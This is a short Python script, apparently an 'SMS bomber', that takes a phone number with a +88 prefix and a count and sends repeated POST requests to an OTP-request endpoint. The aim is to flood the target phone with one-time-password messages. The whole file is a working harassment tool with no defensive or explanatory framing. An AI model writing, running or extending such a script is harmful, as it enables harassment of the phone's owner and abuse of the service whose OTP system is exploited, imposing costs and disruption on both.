import requests


def bombard(number, amount):
    phone = "+88" + number
    print("SMS BOMBING")
    i = 0
    while i < amount:
        requests.post(
            "https://service.example/api/otp-request",
            data={"phone": phone},
        )
        i += 1
